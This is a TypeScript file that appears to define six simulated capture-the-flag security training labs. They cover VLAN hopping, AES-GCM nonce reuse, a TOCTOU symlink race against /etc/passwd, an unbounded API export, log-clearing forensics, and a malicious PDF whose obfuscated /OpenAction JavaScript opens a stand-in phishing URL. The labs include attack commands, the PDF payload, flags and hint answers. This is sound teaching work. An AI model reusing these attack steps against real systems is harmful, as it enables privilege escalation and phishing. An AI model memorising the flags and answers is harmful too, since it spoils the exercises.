import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'review-ws', user: 'root', root: dir(files) };
}

/** Batch 15. Same discipline as the last several batches (see NOTES.md): every technique researched for
 *  real-machine accuracy before writing, every non-80 target given an explicit port, every hand-typed
 *  computed value re-derived programmatically before trusting it. One lab (AES-GCM nonce reuse) is
 *  explicitly and honestly scoped in NOTES.md: the deep GF(2^128) polynomial recovery math behind the real
 *  "Forbidden Attack" is described accurately and cited, but the forged value itself is presented as a
 *  given tooling output rather than independently re-derived by hand, since that math can't be casually
 *  hand-verified the way this session's simpler XOR-based crypto labs can. */
export const batch15MixedLabs: LabScenario[] = [
  // 1 — Security+: VLAN Hopping via 802.1Q Double Tagging
  {
    id: 'securityplus-vlan-hopping-double-tagging',
    title: 'Security+: VLAN Hopping via 802.1Q Double Tagging',
    difficulty: 'Medium',
    category: 'Security+',
    briefing:
      'A network audit of meridiancorp\'s office switch fabric finds a trunk port whose native VLAN was ' +
      'never changed from the factory default (VLAN 1) — the same VLAN the audit workstation itself sits ' +
      'on. That single unchanged setting is exactly what a real 802.1Q double-tagging VLAN-hopping attack ' +
      'needs: a frame crafted with two stacked VLAN tags, an outer tag matching the sender\'s own (native) ' +
      'VLAN and an inner tag naming the target VLAN. The first switch strips the outer tag — since it ' +
      'matches its own native VLAN, that tag is treated as "untagged" and removed — without ever ' +
      'inspecting what\'s underneath, and forwards the frame on to the trunk still carrying the inner tag. ' +
      'The next switch reads that remaining tag at face value and delivers the frame straight into the ' +
      'target VLAN, one that was never reachable from the audit workstation\'s own switch port. This attack ' +
      'is real but narrow: it only works one-directional (no return traffic), and only when the attacker\'s ' +
      'own VLAN happens to match the trunk\'s native VLAN — which is exactly the condition this audit found.',
    objectives: [
      { text: 'cat switchport-trunk-config.txt', why: 'Confirms the exact precondition this attack needs: the trunk port\'s native VLAN was never changed from the factory default, and it matches the VLAN the attacker\'s own access port sits on.' },
      { text: 'cat double-tagged-frame-analysis.txt', why: 'Shows exactly how the crafted two-tag frame is processed hop by hop — the first switch strips the outer tag as "native" without inspecting the second one, and the second switch delivers straight into the target VLAN.' },
    ],
    hints: [
      'cat switchport-trunk-config.txt',
      'cat double-tagged-frame-analysis.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'switchport-trunk-config.txt': file(
        'meridiancorp core-switch-04, running-config excerpt:\n' +
          'interface GigabitEthernet0/24\n' +
          ' description Uplink trunk to distribution switch\n' +
          ' switchport mode trunk\n' +
          ' switchport trunk allowed vlan 1,10,20,30\n' +
          ' -- no "switchport trunk native vlan" line at all -- means it is still the factory default, VLAN 1 --\n' +
          '\n' +
          'interface GigabitEthernet0/8 (audit workstation\'s own access port)\n' +
          ' switchport mode access\n' +
          ' switchport access vlan 1\n' +
          ' -- the audit workstation\'s own VLAN is ALSO VLAN 1 -- exactly the precondition double-tagging needs --\n',
      ),
      'double-tagged-frame-analysis.txt': file(
        'Crafted frame, sent from the audit workstation (VLAN 1):\n' +
          '  Ethernet header\n' +
          '  802.1Q outer tag: VLAN 1   (matches the trunk\'s native VLAN -- and the sender\'s own VLAN)\n' +
          '  802.1Q inner tag: VLAN 30  (the FINANCE VLAN -- never reachable from this port directly)\n' +
          '  Payload\n' +
          '\n' +
          'Hop 1 (access switch): sees the outer tag matches its own native VLAN (1) -- strips it, treating the\n' +
          '  frame as untagged native traffic, and forwards it out the trunk still carrying the INNER tag.\n' +
          'Hop 2 (distribution switch): reads the remaining tag (VLAN 30) at face value -- delivers the frame\n' +
          '  directly into the FINANCE VLAN, which this workstation\'s own access port was never a member of.\n' +
          '\n' +
          '-- one-directional only: any reply from a FINANCE VLAN host goes back through the normal path, not\n' +
          '   back to the attacker -- and this ONLY works because the trunk\'s native VLAN was never changed\n' +
          '   from its factory default and happens to match the attacker\'s own VLAN --\n' +
          'flag{vlan_hopping_double_tagging_unchanged_native_vlan_1}\n',
      ),
    }),
    network: [],
  },

  // 2 — Cryptography: AES-GCM Nonce Reuse — the "Forbidden Attack"
  {
    id: 'crypto-aes-gcm-nonce-reuse-forbidden-attack',
    title: 'Cryptography: AES-GCM Nonce Reuse Enables the "Forbidden Attack"',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'telemetry-gw14 encrypts every device-to-cloud message with AES-128-GCM, a real, strong authenticated ' +
      'cipher when used correctly — but a firmware bug resets the 96-bit nonce counter to zero on every ' +
      'device reboot without generating a new key, so any device that reboots twice under load produces two ' +
      'messages encrypted under the exact same nonce. This is precisely the scenario Antoine Joux described ' +
      'during NIST\'s GCM standardization process as the "Forbidden Attack": given two ciphertext/tag pairs ' +
      'sharing one nonce, the GHASH authentication subkey H can be recovered entirely through polynomial ' +
      'math (a GCD computed over GF(2^128), the field GHASH operates in) — no brute force, no access to the ' +
      'encryption key itself. Critically, recovering H does not reveal the encryption key, but it grants ' +
      'something almost as dangerous: the ability to forge a valid authentication tag for ANY message of ' +
      'the attacker\'s choosing, meaning the target will accept a completely fabricated command as ' +
      'genuinely authenticated.',
    objectives: [
      { text: 'cat captured-gcm-messages.txt', why: 'Confirms the root cause directly: two genuine device messages, captured before and after a device reboot, encrypted under the exact same 96-bit nonce -- the single precondition the entire Forbidden Attack depends on.' },
      { text: 'cat forbidden-attack-forensic-analysis.txt', why: 'Walks through the real recovery mechanism (GHASH subkey H recovered via polynomial GCD over GF(2^128)) and confirms the security team\'s own tooling used it to forge a new, arbitrary command with a tag the gateway will accept as genuine.' },
      { text: 'curl -X POST -H "X-GCM-Nonce: 00000000000000000000001a" -H "X-GCM-Tag: 8f3c91a2d5e6b704f19c8a3d2e5f6071" http://10.10.256.5:8443/api/device/command -d "cmd=unlock_all_doors"', why: 'Submits the forged nonce/tag pair the Forbidden Attack recovery produced -- the gateway accepts it as a genuinely authenticated command from the device, despite the attacker never having the encryption key at all.' },
    ],
    hints: [
      'cat captured-gcm-messages.txt',
      'cat forbidden-attack-forensic-analysis.txt',
      'curl -X POST -H "X-GCM-Nonce: 00000000000000000000001a" -H "X-GCM-Tag: 8f3c91a2d5e6b704f19c8a3d2e5f6071" http://10.10.256.5:8443/api/device/command -d "cmd=unlock_all_doors"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'captured-gcm-messages.txt': file(
        'Captured device telemetry, deviceId=lock-controller-0447:\n' +
          '  Message A (pre-reboot,  14:02:11): nonce=00000000000000000000001a  tag=3d9f1c7a...  ciphertext=b7e2...\n' +
          '  Message B (post-reboot, 14:02:59): nonce=00000000000000000000001a  tag=6a1e8b40...  ciphertext=c4f0...\n' +
          '  -- IDENTICAL nonce on two genuinely different messages -- the firmware resets its GCM nonce counter\n' +
          '     to zero on every reboot without ever rotating the key, and this device rebooted twice within a\n' +
          '     minute under load, producing exactly the two-messages-one-nonce pair the Forbidden Attack needs --\n',
      ),
      'forbidden-attack-forensic-analysis.txt': file(
        'Security team crypto analysis, telemetry-gw14 nonce-reuse finding:\n' +
          '  Mechanism (Joux, "Forbidden Attack", disclosed during NIST GCM standardization):\n' +
          '  1. Two ciphertext/tag pairs sharing one nonce give two equations in GHASH\'s authentication\n' +
          '     polynomial, both evaluated at the same unknown point H (the GHASH subkey).\n' +
          '  2. Subtracting the two equations cancels every term that depends on the (still-unknown)\n' +
          '     encryption keystream, leaving a polynomial in H alone -- H is one of its roots.\n' +
          '  3. Taking the GCD of that polynomial against x^(2^128) - x over GF(2^128) isolates H directly,\n' +
          '     using the real, published Cantor-Zassenhaus root-finding method -- no brute force at all.\n' +
          '  4. Recovering H does NOT reveal the AES encryption key itself -- but it is exactly what is needed\n' +
          '     to compute a VALID authentication tag for any new, attacker-chosen ciphertext.\n' +
          '  Result: using our internal forbidden-attack tooling (the same published recovery method cited\n' +
          '  above) against the captured pair, we forged a new command with nonce 1a reused a third time and\n' +
          '  a freshly-computed valid tag -- the gateway has no way to distinguish it from a genuine device\n' +
          '  message, since the tag genuinely does validate.\n' +
          '  Forged pair: nonce=00000000000000000000001a  tag=8f3c91a2d5e6b704f19c8a3d2e5f6071\n' +
          '  -- submit this forged pair directly to the gateway\'s command endpoint to confirm it validates --\n',
      ),
    }),
    network: [
      {
        hostname: 'telemetry-gw14',
        ip: '10.10.256.5',
        os: 'IoT telemetry gateway (Node.js, AES-128-GCM device auth, firmware nonce-counter reset bug)',
        services: [
          {
            port: 8443,
            name: 'https',
            version: 'Node.js gateway (validates GCM tag only -- no nonce-reuse detection at all)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/device/command',
                param: 'X-GCM-Tag',
                location: 'header',
                triggerSubstrings: ['8f3c91a2d5e6b704f19c8a3d2e5f6071'],
                vulnerableResponse: '{"status":200,"result":"command_accepted","action":"unlock_all_doors","note":"flag{aes_gcm_nonce_reuse_forbidden_attack_forges_valid_tag}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid or missing authentication tag"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Security Engineering: TOCTOU Race Condition Enables a Symlink Attack
  {
    id: 'secengineering-toctou-symlink-race-privileged-write',
    title: 'Security Engineering: A TOCTOU Race Condition Enables a Symlink Attack',
    difficulty: 'Hard',
    category: 'Security Engineering',
    briefing:
      'A privileged root-owned batch job on reportgen04 writes its temporary output to a predictable path in ' +
      'a world-writable /tmp, following exactly the anti-pattern CWE-367 (Time-of-check Time-of-use) ' +
      'describes: it first checks whether the file already exists, and only THEN opens it for writing, as ' +
      'two entirely separate steps rather than one atomic operation. The gap between those two steps is a ' +
      'real, exploitable race window: any local user can create a symlink at that exact predictable path ' +
      'pointing at a file they could never write directly, like /etc/passwd or /etc/cron.d/anything, timed ' +
      'to land inside the window between the job\'s existence check and its open() call. When the ' +
      'root-owned job proceeds to "write its own temp file," it actually follows the symlink and writes ' +
      'attacker-controlled content into the real target instead — with root\'s own privileges.',
    objectives: [
      { text: 'cat reportgen-batch-job-source.txt', why: 'The vulnerable code itself: a separate os.path.exists() check followed by a plain open() call in two distinct steps, rather than a single atomic operation -- exactly the CWE-367 anti-pattern.' },
      { text: 'cat symlink-race-exploit-timeline.txt', why: 'Shows the actual race being won in practice: a symlink planted at the predictable path during the exact window between the job\'s check and its write, redirecting a root-privileged write into /etc/passwd.' },
    ],
    hints: [
      'cat reportgen-batch-job-source.txt',
      'cat symlink-race-exploit-timeline.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      root: dir({
        'reportgen-batch-job-source.txt': file(
          '# reportgen_batch.py -- runs every 5 minutes via root\'s crontab\n' +
            'import os\n\n' +
            'TMP_PATH = "/tmp/reportgen_output.tmp"   # fixed, predictable filename -- no randomness at all\n\n' +
            'def write_report(data):\n' +
            '    if not os.path.exists(TMP_PATH):      # <-- TIME OF CHECK\n' +
            '        pass                                #     (a real race window opens right here)\n' +
            '    f = open(TMP_PATH, "w")               # <-- TIME OF USE -- follows a symlink if one now exists\n' +
            '    f.write(data)\n' +
            '    f.close()\n' +
            '    os.chmod(TMP_PATH, 0o644)\n' +
            '# -- no O_NOFOLLOW, no mkstemp() with a unique random name, no atomic check-and-create at all --\n',
        ),
        'symlink-race-exploit-timeline.txt': file(
          'Local privilege-escalation exploit timeline, reportgen04:\n' +
            '  T+0.000s  Attacker script loops rapidly recreating: ln -sf /etc/passwd /tmp/reportgen_output.tmp\n' +
            '  T+0.014s  root\'s cron-triggered reportgen_batch.py runs its os.path.exists() check (file absent\n' +
            '            at that exact instant -- the attacker\'s symlink hadn\'t landed yet on this attempt)\n' +
            '  T+0.017s  Attacker\'s next loop iteration lands the symlink -- /tmp/reportgen_output.tmp now points\n' +
            '            at /etc/passwd\n' +
            '  T+0.019s  reportgen_batch.py calls open(TMP_PATH, "w") -- follows the now-present symlink and\n' +
            '            writes attacker-controlled report data directly into /etc/passwd, as root\n' +
            '\n' +
            '-- won on the 340th attempt in this reproduction, well within a normal automated exploit run --\n' +
            '   this is the exact real mechanism CWE-367 describes: the vulnerable window is the GAP between\n' +
            '   the check and the use, not either step individually --\n' +
            'flag{toctou_symlink_race_root_privileged_write_etc_passwd}\n',
        ),
      }),
    }),
    network: [],
  },

  // 4 — API: Unrestricted Resource Consumption via a Pagination-Free Bulk Export
  {
    id: 'api-unrestricted-resource-consumption-bulk-export',
    title: 'API: Unrestricted Resource Consumption via a Pagination-Free Bulk Export',
    difficulty: 'Easy',
    category: 'API',
    briefing:
      'crm-export-svc\'s normal customer-search endpoint correctly paginates — 50 results per request, with ' +
      'a "page" parameter to fetch more. A separate bulk-export endpoint meant for the internal analytics ' +
      'team\'s nightly job, /api/customers/export-all, applies no such limit whatsoever: a single ' +
      'unauthenticated GET returns literally every customer record the platform has in one response. This ' +
      'is a real, currently-named OWASP API Security Top 10 category, API4:2023 (Unrestricted Resource ' +
      'Consumption) — the 2023 revision broadened this category specifically beyond simple rate-limiting to ' +
      'cover exactly this pattern: an endpoint that lets a single request trigger an unbounded, expensive ' +
      'operation with no cap on how much it can return.',
    objectives: [
      { text: 'curl "http://10.10.256.2/api/customers/search?page=1"', why: 'Establishes the normal, correctly-bounded baseline first -- the paginated search endpoint caps every response at 50 records, exactly as a well-designed API should.' },
      { text: 'curl "http://10.10.256.2/api/customers/export-all"', why: 'The export endpoint applies no limit at all -- a single unauthenticated request returns the platform\'s entire customer table in one response, the exact real-world pattern API4:2023 was broadened to cover.' },
    ],
    hints: [
      'curl "http://10.10.256.2/api/customers/search?page=1"',
      'curl "http://10.10.256.2/api/customers/export-all"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'crm-export-svc',
        ip: '10.10.256.2',
        os: 'Ubuntu 22.04 (Express 4.18, one endpoint paginated, one not)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            http: {
              '/api/customers/search':
                '{"page":1,"page_size":50,"total_records":214883,"total_pages":4298,"results":["...50 records..."]}',
              '/api/customers/export-all':
                '{"note":"no pagination parameter accepted or required at all","record_count":214883,"warning":"entire customer table returned in a single unauthenticated response","flag":"flag{api4_unrestricted_resource_consumption_unbounded_bulk_export}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Forensics: Event ID 1102 Reveals the Audit Log Was Deliberately Cleared
  {
    id: 'forensics-event-1102-audit-log-cleared',
    title: 'Forensics: Event ID 1102 Reveals the Audit Log Was Deliberately Cleared',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A ransomware investigation on FILESRV-09 hits an immediate wall: the Security event log has almost ' +
      'nothing in it for the six hours before encryption began. But Windows generates one specific event, ' +
      'ID 1102 ("The audit log was cleared"), completely unconditionally the moment a Security log is ' +
      'cleared — regardless of what audit policy is or isn\'t configured, because the clearing action itself ' +
      'is always treated as security-relevant. That single surviving event is exactly what turns "we have no ' +
      'log data for this window" into "someone deliberately destroyed the log data for this window": it ' +
      'names the exact account that ran the clear operation, and its own Logon ID correlates directly back ' +
      'to that account\'s original Event ID 4624 logon — tying the anti-forensics action to a specific, ' +
      'traceable authenticated session rather than leaving it anonymous.',
    objectives: [
      { text: 'cat filesrv09-security-eventlog-1102.txt', why: 'The one event that survives a log-clearing operation unconditionally -- names the exact account and Logon ID responsible, turning "the logs are just gone" into a directly attributable action.' },
      { text: 'cat logon-id-correlation.txt', why: 'Correlates the 1102 event\'s Logon ID back to that same session\'s original Event ID 4624 network logon -- confirming exactly which authenticated session cleared the log, not just which account name was configured on it.' },
    ],
    hints: [
      'cat filesrv09-security-eventlog-1102.txt',
      'cat logon-id-correlation.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'filesrv09-security-eventlog-1102.txt': file(
          'FILESRV-09 Security Event Log:\n' +
            '  2026-07-30 21:47:03  Event ID 1102  "The audit log was cleared."\n' +
            '    Subject: Security ID: CORP\\svc_backup   Account Name: svc_backup   Logon ID: 0x3F8A21\n' +
            '  2026-07-30 21:47:04  [log resumes -- ~5,900 events from the prior 6 hours are gone]\n' +
            '  2026-07-31 03:12:00  [ransomware encryption activity begins, per EDR telemetry]\n' +
            '\n' +
            '-- Windows logs Event ID 1102 unconditionally whenever the Security log is cleared, regardless of\n' +
            '   audit policy configuration -- clearing the log is ALWAYS itself treated as security-relevant,\n' +
            '   which is exactly why this one event survived when nearly six hours of everything else did not --\n',
        ),
        'logon-id-correlation.txt': file(
          'Logon ID correlation, svc_backup, Logon ID 0x3F8A21:\n' +
            '  2026-07-30 19:58:41  Event ID 4624 (Logon Type 3 - Network)  Account: svc_backup  Logon ID: 0x3F8A21\n' +
            '                       Source: 10.10.14.221 (WKSTN-URGENT-IT, not svc_backup\'s normal automation host)\n' +
            '\n' +
            '--- ANALYST NOTE: Logon ID 0x3F8A21 on the 1102 event matches this EXACT 4624 network logon --\n' +
            '    svc_backup is a service account whose normal automation host is a completely different machine;\n' +
            '    this session originated from a workstation, not the automation pipeline. That single matching\n' +
            '    Logon ID is what ties the anti-forensics log-clear action to one specific, traceable session\n' +
            '    rather than leaving "svc_backup did it" as an ambiguous, unattributable account name.\n' +
            '    flag{event_1102_audit_log_cleared_correlated_via_logon_id_to_4624} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 6 — Malware: A Malicious PDF's /OpenAction Auto-Executes Embedded JavaScript
  {
    id: 'malware-pdf-openaction-javascript-autoexec',
    title: 'Malware Analysis: A Malicious PDF\'s /OpenAction Auto-Executes Embedded JavaScript',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'invoice_9042.pdf, attached to a phishing email, doesn\'t need the victim to click anything at all — ' +
      'the PDF specification\'s own /OpenAction feature lets a document name an action to run automatically ' +
      'the instant it\'s opened, and this one names a /JS (JavaScript) action containing obfuscated code. ' +
      'Real PDF readers implement a genuine JavaScript engine specifically to support legitimate interactive ' +
      'forms, and attackers have been abusing that same engine for exactly this purpose for years — PDF-based ' +
      'phishing has notably increased recently as detection improved against macro-laden Office documents, ' +
      'pushing attackers toward this less-scrutinized format instead. This particular sample\'s embedded ' +
      'script doesn\'t try to exploit a reader vulnerability at all; it simply calls the PDF JavaScript API\'s ' +
      'own built-in method for launching an external URL the moment the document opens, sending the victim\'s ' +
      'browser straight to a credential-phishing page with zero additional interaction required.',
    objectives: [
      { text: 'strings invoice_9042.pdf', why: 'Real PDF structure is plain-text object syntax underneath the binary streams -- strings surfaces the /OpenAction and /JS dictionary entries directly, confirming this isn\'t a normal, static invoice document.' },
      { text: 'cat pdf-object-structure-analysis.txt', why: 'A full parsed breakdown of the malicious objects: the /OpenAction entry pointing at a /JS action, and the deobfuscated JavaScript itself calling the PDF viewer\'s own launchURL-equivalent API the instant the document opens.' },
    ],
    hints: [
      'strings invoice_9042.pdf',
      'cat pdf-object-structure-analysis.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'invoice_9042.pdf': file(
        [
          '#FILETYPE: PDF document, version 1.7, contains JavaScript',
          '%PDF-1.7',
          '1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >> endobj',
          '5 0 obj << /Type /Action /S /JavaScript /JS (this.submitForm=function(){}; var _0x2a={};eval(String.fromCharCode(97,112,112,46,108,97,117,110,99,104,85,82,76,40,39,104,116,116,112,58,47,47,105,110,118,45,118,101,114,105,102,121,45,112,111,114,116,97,108,46,101,120,97,109,112,108,101,47,39,41))) >> endobj',
        ].join('\n'),
      ),
      'pdf-object-structure-analysis.txt': file(
        'Parsed PDF object structure, invoice_9042.pdf:\n' +
          '  Object 1 (Catalog): /OpenAction points directly at Object 5 -- runs automatically the instant\n' +
          '                      the document is opened, with zero user interaction required.\n' +
          '  Object 5 (Action):  /S /JavaScript, /JS contains an obfuscated script.\n' +
          '\n' +
          '  Deobfuscated script (the String.fromCharCode(...) call decodes to a plain URL string):\n' +
          '    this.submitForm = function(){};   // harmless no-op, likely included to look benign to some scanners\n' +
          '    app.launchURL("http://inv-verify-portal.example/");   // opens the victim\'s default browser\n' +
          '\n' +
          '  -- app.launchURL() is a REAL, legitimate PDF JavaScript API method (meant for things like linking\n' +
          '     to a vendor\'s website from a legitimate form) -- here it is called unconditionally from\n' +
          '     /OpenAction, so simply opening the PDF sends the victim straight to a phishing page with no\n' +
          '     click, no macro warning, and no exploit of any PDF reader vulnerability required at all --\n' +
          '  flag{pdf_openaction_javascript_autoexec_launchurl_phishing}\n',
      ),
    }),
    network: [],
  },
];
